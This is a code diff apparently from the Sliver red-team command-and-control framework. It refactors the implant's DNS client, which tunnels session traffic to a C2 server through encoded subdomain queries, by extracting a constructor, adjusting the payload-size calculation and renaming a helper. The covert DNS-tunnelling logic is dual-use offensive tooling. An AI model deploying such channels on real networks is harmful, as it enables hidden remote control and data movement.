@@ -98,27 +98,29 @@ func DNSStartSession(parent string, retryWait time.Duration, timeout time.Durati
 	// {{if .Config.Debug}}
 	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
 	// {{end}}
-	client := &SliverDNSClient{
-		metadata:     map[string]*ResolverMetadata{},
-		parent:       strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + ".",
-		forceBase32:  false, // Force case insensitive encoding
-		queryTimeout: timeout,
-		retryWait:    retryWait,
-		retryCount:   3,
-		closed:       true,
-
-		// 254 is the max domain length, subtract parent length, and
-		// then subtract the max number of dots we need for subdomains
-		// dots is calculated as 63 chars + 1 dot (64 chars)
-		subdataSpace: 254 - len(parent) - ((254 - len(parent)) / 64),
-		base32:       encoders.Base32{},
-		base58:       encoders.Base58{},
-	}
+	client := newDNSClient(parent, timeout, retryWait)
 	err := client.SessionInit()
 	if err != nil {
 		return nil, err
 	}
 	return client, nil
+}
+
+func newDNSClient(parent string, timeout time.Duration, retryWait time.Duration) *SliverDNSClient {
+	parent = strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + "."
+	return &SliverDNSClient{
+		metadata:     map[string]*ResolverMetadata{},
+		parent:       parent,
+		forceBase32:  false,
+		queryTimeout: timeout,
+		retryWait:    retryWait,
+		retryCount:   3,
+		closed:       true,
+
+		subdataSpace: 254 - len(parent) - (1 + (254-len(parent))/64),
+		base32:       encoders.Base32{},
+		base58:       encoders.Base58{},
+	}
 }
 
 // SliverDNSClient - The DNS client context
@@ -354,7 +356,7 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if err != nil {
 		return nil, err
 	}
-	domain, err := s.joinSubdata(pollMsg)
+	domain, err := s.joinSubdataToParent(pollMsg)
 	if err != nil {
 		return nil, err
 	}
@@ -439,7 +441,7 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) (*pb.Envelope
 			Stop:  stop,
 		})
 		// This message will always fit in base32
-		subdata, err := s.joinSubdata(string(s.base32.Encode(recvMsg)))
+		subdata, err := s.joinSubdataToParent(string(s.base32.Encode(recvMsg)))
 		if err != nil {
 			return nil, err
 		}
@@ -512,7 +514,7 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), maxLength)
 			// {{end}}
 		}
-		domain, err := s.joinSubdata(encoded)
+		domain, err := s.joinSubdataToParent(encoded)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[dns] join subdata failed: %s", err)
@@ -533,7 +535,7 @@ func (s *SliverDNSClient) getDNSSessionID() error {
 	if err != nil {
 		return err
 	}
-	otpDomain, err := s.joinSubdata(otpMsg)
+	otpDomain, err := s.joinSubdataToParent(otpMsg)
 	if err != nil {
 		return err
 	}
@@ -570,7 +572,9 @@ func (s *SliverDNSClient) loadResolvConf() error {
 	return err
 }
 
-func (s *SliverDNSClient) joinSubdata(subdata string) (string, error) {
+// Joins subdata to the parent domain, you must have already done the math to
+// ensure the subdata can fit in the domain
+func (s *SliverDNSClient) joinSubdataToParent(subdata string) (string, error) {
 	if s.subdataSpace <= len(subdata) {
 		return "", errMsgTooLong // For sure won't fit after we add '.'
 	}
@@ -696,7 +700,7 @@ func (s *SliverDNSClient) benchmark(id int, encoder encoders.Encoder, resolver D
 			// {{end}}
 			continue
 		}
-		domain, err := s.joinSubdata(string(encoder.Encode(finger)))
+		domain, err := s.joinSubdataToParent(string(encoder.Encode(finger)))
 		if err != nil {
 			meta.Errors++
 			// {{if .Config.Debug}}
